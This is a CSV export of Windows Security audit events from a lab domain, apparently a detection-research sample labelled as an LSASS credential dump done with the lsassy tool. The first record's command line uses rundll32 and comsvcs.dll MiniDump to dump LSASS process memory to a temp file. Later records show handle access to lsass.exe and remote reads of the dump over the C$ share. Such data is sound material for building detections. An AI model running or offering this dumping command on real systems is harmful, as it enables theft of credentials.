RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
14,67790,2021-10-20 14:29:10.5268992,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4040,FS03.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,"Parent process: ",PID: 0xFF8,Parent PID: 0x998,"Mandatory label: ",Target User: -\-,,"C:\Windows\System32\rundll32.exe ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\2V7Be7Gq.dmp full",False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BE03C""},{""@Name"":""NewProcessId"",""#text"":""0xFF8""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x998""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\System32\\rundll32.exe\""  C:\\Windows\\System32\\comsvcs.dll MiniDump 512 \\Windows\\Temp\\2V7Be7Gq.dmp full""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""}]}}"
15,67793,2021-10-20 14:29:10.5425177,4656,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,A handle to an object was requested,OFFSEC\admmig,,ObjectType: Process,ObjectName: \Device\HarddiskVolume2\Windows\System32\lsass.exe,HandleId: 0xDC,TransactionId: 00000000-0000-0000-0000-000000000000,"AccessList: Unknown code (%%4484, %%4490, %%4492, )",PrivilegeList: -,C:\Windows\System32\rundll32.exe (PID: 0xFF8),False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BE03C""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Process""},{""@Name"":""ObjectName"",""#text"":""\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe""},{""@Name"":""HandleId"",""#text"":""0xDC""},{""@Name"":""TransactionId"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""AccessList"",""#text"":""%%4484, %%4490, %%4492, ""},{""@Name"":""AccessReason"",""#text"":""-""},{""@Name"":""AccessMask"",""#text"":""0x1410""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""RestrictedSidCount"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0xFF8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""ResourceAttributes"",""#text"":""-""}]}}"
16,67796,2021-10-20 14:29:10.5425177,4656,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,A handle to an object was requested,OFFSEC\admmig,,ObjectType: Process,ObjectName: \Device\HarddiskVolume2\Windows\System32\lsass.exe,HandleId: 0xF0,TransactionId: 00000000-0000-0000-0000-000000000000,"AccessList: Unknown code (%%1537, %%1538, %%1539, %%1540, %%1541, %%4480, %%4481, %%4482, %%4483, %%4484, %%4485, %%4486, %%4487, %%4488, %%4489, %%4490, %%4491, %%4492, %%4493, %%4494, %%4495, )",PrivilegeList: -,C:\Windows\System32\rundll32.exe (PID: 0xFF8),False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BE03C""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Process""},{""@Name"":""ObjectName"",""#text"":""\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe""},{""@Name"":""HandleId"",""#text"":""0xF0""},{""@Name"":""TransactionId"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""AccessList"",""#text"":""%%1537, %%1538, %%1539, %%1540, %%1541, %%4480, %%4481, %%4482, %%4483, %%4484, %%4485, %%4486, %%4487, %%4488, %%4489, %%4490, %%4491, %%4492, %%4493, %%4494, %%4495, ""},{""@Name"":""AccessReason"",""#text"":""-""},{""@Name"":""AccessMask"",""#text"":""0x1FFFFF""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""RestrictedSidCount"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0xFF8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""ResourceAttributes"",""#text"":""-""}]}}"
17,67797,2021-10-20 14:29:10.5425177,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4040,FS03.offsec.lan,0,,Attempt was made to access an object,OFFSEC\admmig,,ObjectServer: Security,ObjectType: Process,ObjectName: \Device\HarddiskVolume2\Windows\System32\lsass.exe,"AccessList: Unknown code (%%4484, )",,,C:\Windows\System32\rundll32.exe,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BE03C""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Process""},{""@Name"":""ObjectName"",""#text"":""\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe""},{""@Name"":""HandleId"",""#text"":""0xF0""},{""@Name"":""AccessList"",""#text"":""%%4484, ""},{""@Name"":""AccessMask"",""#text"":""0x10""},{""@Name"":""ProcessId"",""#text"":""0xFF8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""ResourceAttributes"",""#text"":""-""}]}}"
18,67799,2021-10-20 14:29:10.5425177,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4040,FS03.offsec.lan,0,,Attempt was made to access an object,OFFSEC\admmig,,ObjectServer: Security,ObjectType: Process,ObjectName: \Device\HarddiskVolume2\Windows\System32\lsass.exe,"AccessList: Unknown code (%%4484, )",,,C:\Windows\System32\rundll32.exe,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BE03C""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Process""},{""@Name"":""ObjectName"",""#text"":""\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe""},{""@Name"":""HandleId"",""#text"":""0xDC""},{""@Name"":""AccessList"",""#text"":""%%4484, ""},{""@Name"":""AccessMask"",""#text"":""0x10""},{""@Name"":""ProcessId"",""#text"":""0xFF8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""ResourceAttributes"",""#text"":""-""}]}}"
19,67801,2021-10-20 14:29:11.2300346,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.123.11:49192,Share: \\*\C$ (\??\C:\),Object: Windows\Temp\2V7Be7Gq.dmp,AccessList: ReadData (or ListDirectory),AccessMask: Unknown code (0x1),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BDFAC""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.123.11""},{""@Name"":""IpPort"",""#text"":""49192""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""Windows\\Temp\\2V7Be7Gq.dmp""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""AccessList"",""#text"":""%%4416, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
20,67802,2021-10-20 14:29:11.4994071,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61966,Share: \\*\C$ (\??\C:\),Object: \,AccessList: Unknown code (%%1541 | %%4416 | %%4423),AccessMask: Unknown code (0x100081),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61966""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""\\""},{""@Name"":""AccessMask"",""#text"":""0x100081""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
21,67803,2021-10-20 14:29:12.5530642,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.123.11:49192,Share: \\*\C$ (\??\C:\),Object: Windows\Temp\2V7Be7Gq.dmp,AccessList: Unknown code (%%1537 | %%4423),AccessMask: Unknown code (0x10080),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x26BDFAC""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.123.11""},{""@Name"":""IpPort"",""#text"":""49192""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""Windows\\Temp\\2V7Be7Gq.dmp""},{""@Name"":""AccessMask"",""#text"":""0x10080""},{""@Name"":""AccessList"",""#text"":""%%1537, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
22,67804,2021-10-20 14:29:13.7250055,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61966,Share: \\*\C$ (\??\C:\),Object: \,AccessList: Unknown code (%%1541 | %%4416 | %%4423),AccessMask: Unknown code (0x100081),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61966""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""\\""},{""@Name"":""AccessMask"",""#text"":""0x100081""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
23,67805,2021-10-20 14:29:13.7250055,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61964,Share: \\*\C$ (\??\C:\),Object: Sysmon\desktop.ini,AccessList: Unknown code (%%1538 | %%1541 | %%4416 | %%4419 | %%4423),AccessMask: Unknown code (0x120089),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61964""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""Sysmon\\desktop.ini""},{""@Name"":""AccessMask"",""#text"":""0x120089""},{""@Name"":""AccessList"",""#text"":""%%1538, %%1541, %%4416, %%4419, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
24,67806,2021-10-20 14:29:15.6157798,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61962,Share: \\*\C$ (\??\C:\),Object: \,AccessList: Unknown code (%%1541 | %%4416 | %%4423),AccessMask: Unknown code (0x100081),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61962""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""\\""},{""@Name"":""AccessMask"",""#text"":""0x100081""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
25,67807,2021-10-20 14:29:18.3188262,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61962,Share: \\*\C$ (\??\C:\),Object: \,AccessList: Unknown code (%%1541 | %%4416 | %%4423),AccessMask: Unknown code (0x100081),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61962""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""\\""},{""@Name"":""AccessMask"",""#text"":""0x100081""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
26,67808,2021-10-20 14:29:22.2917996,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61962,Share: \\*\C$ (\??\C:\),Object: \,AccessList: Unknown code (%%1541 | %%4416 | %%4423),AccessMask: Unknown code (0x100081),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61962""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""\\""},{""@Name"":""AccessMask"",""#text"":""0x100081""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
27,67809,2021-10-20 14:29:22.2917996,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61965,Share: \\*\C$ (\??\C:\),Object: Sysmon\desktop.ini,AccessList: Unknown code (%%1538 | %%1541 | %%4416 | %%4419 | %%4423),AccessMask: Unknown code (0x120089),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61965""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""Sysmon\\desktop.ini""},{""@Name"":""AccessMask"",""#text"":""0x120089""},{""@Name"":""AccessList"",""#text"":""%%1538, %%1541, %%4416, %%4419, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
28,67810,2021-10-20 14:29:25.6249889,5145,LogAlways,Microsoft-Windows-Security-Auditing,Security,512,520,FS03.offsec.lan,0,,Network share object access,OFFSEC\admmig,10.23.23.9:61964,Share: \\*\C$ (\??\C:\),Object: \,AccessList: Unknown code (%%1541 | %%4416 | %%4423),AccessMask: Unknown code (0x100081),SID: S-1-5-21-4230534742-2542757381-3142984815-1111,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID4688-4663-4656-LSASS dump with LSASSY (process).evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x262BB6B""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""IpAddress"",""#text"":""10.23.23.9""},{""@Name"":""IpPort"",""#text"":""61964""},{""@Name"":""ShareName"",""#text"":""\\\\*\\C$""},{""@Name"":""ShareLocalPath"",""#text"":""\\??\\C:\\""},{""@Name"":""RelativeTargetName"",""#text"":""\\""},{""@Name"":""AccessMask"",""#text"":""0x100081""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, %%4423, ""},{""@Name"":""AccessReason"",""#text"":""-""}]}}"
